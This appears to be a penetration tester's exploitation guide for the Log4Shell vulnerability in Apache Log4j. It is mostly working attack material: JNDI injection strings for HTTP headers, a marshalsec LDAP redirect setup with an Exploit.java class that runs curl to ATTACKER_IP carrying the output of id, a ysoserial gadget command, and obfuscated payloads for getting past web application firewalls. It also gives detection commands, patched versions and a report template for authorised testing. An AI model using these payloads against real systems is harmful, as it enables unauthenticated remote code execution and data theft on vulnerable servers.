# Log4Shell (CVE-2021-44228) — Exploitation Guide

## Overview
Log4Shell is a critical RCE vulnerability in Apache Log4j 2.x (≤2.14.1) via JNDI lookup injection.
CVSS: 10.0 (Critical). Affects any Java app logging user-controlled input with Log4j2.

## Detection

### Injection Points
Any HTTP header, parameter, or user-controlled field that gets logged:
```
User-Agent: ${jndi:ldap://CALLBACK.interact.sh/a}
X-Forwarded-For: ${jndi:ldap://CALLBACK.interact.sh/a}
X-Api-Version: ${jndi:ldap://CALLBACK.interact.sh/a}
Referer: ${jndi:ldap://CALLBACK.interact.sh/a}
Cookie: session=${jndi:ldap://CALLBACK.interact.sh/a}
Authorization: Bearer ${jndi:ldap://CALLBACK.interact.sh/a}
```

### nuclei Template
```bash
nuclei -t cves/2021/CVE-2021-44228.yaml -u https://TARGET -interactsh-server CALLBACK
```

### Manual Detection with interactsh
```bash
# Start interactsh client
interactsh-client

# Inject into all headers
curl -H 'X-Api-Version: ${jndi:ldap://YOUR_ID.oast.fun/a}' \
     -H 'User-Agent: ${jndi:ldap://YOUR_ID.oast.fun/b}' \
     https://TARGET/
```

## Exploitation

### JNDI Exploit Server (marshalsec)
```bash
# Build marshalsec
git clone https://github.com/mbechler/marshalsec /workspace/marshalsec
cd /workspace/marshalsec && mvn clean package -DskipTests

# Start LDAP redirect server → HTTP exploit server
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8888/#Exploit"

# Serve malicious class
mkdir /workspace/log4shell-exploit && cd /workspace/log4shell-exploit
cat > Exploit.java << 'EOF'
public class Exploit {
  static {
    try {
      Runtime.getRuntime().exec("curl ATTACKER_IP:9999/?pwned=$(id)");
    } catch (Exception e) {}
  }
}
EOF
javac Exploit.java
python3 -m http.server 8888

# Trigger
curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/a}' https://TARGET/
```

### ysoserial JRMP (Java ≥8u191)
For newer JVM (trustURLCodebase=false by default), use deserialization gadget chains:
```bash
# Requires vulnerable gadget library in classpath
java -jar ysoserial.jar CommonsCollections5 "curl ATTACKER:9999/?x=\$(id)" | base64
```

### log4j-scan (Automated)
```bash
pip install log4j-scan 2>/dev/null || true
python3 log4j-scan.py -u https://TARGET --run-all-tests --callback-url INTERACT_URL
```

## Bypass Techniques

### WAF Bypass Obfuscation
```
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://CALLBACK/a}
${j${::-n}di:ldap://CALLBACK/a}
${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://CALLBACK/a}
${${upper:j}ndi:ldap://CALLBACK/a}
${jndi:${lower:l}${lower:d}a${lower:p}://CALLBACK/a}
%24%7Bjndi%3Aldap%3A%2F%2FCALLBACK%2Fa%7D
```

## Affected Versions & Patches
| Version | Status |
|---------|--------|
| Log4j2 ≤ 2.14.1 | Vulnerable (RCE via JNDI) |
| Log4j2 2.15.0 | Partial fix (still DoS via CVE-2021-45046) |
| Log4j2 2.16.0 | JNDI disabled by default |
| Log4j2 ≥ 2.17.0 | Fully patched |
| Log4j 1.x | EOL, use CVE-2019-17571 deserialization instead |

## Report Template
```
Vulnerability: Log4Shell (CVE-2021-44228)
CVSS Score: 10.0 Critical
Affected Component: Apache Log4j2 [VERSION]
Impact: Unauthenticated Remote Code Execution
Evidence: JNDI callback received from TARGET at [TIMESTAMP]
  Payload: ${jndi:ldap://CALLBACK/a} in [HEADER/PARAMETER]
  Callback: DNS/LDAP interaction logged by interactsh
Remediation: Upgrade Log4j2 to ≥ 2.17.1 or set
  -Dlog4j2.formatMsgNoLookups=true (temporary mitigation only)
```

indicators: log4shell log4j jndi rce cve-2021-44228
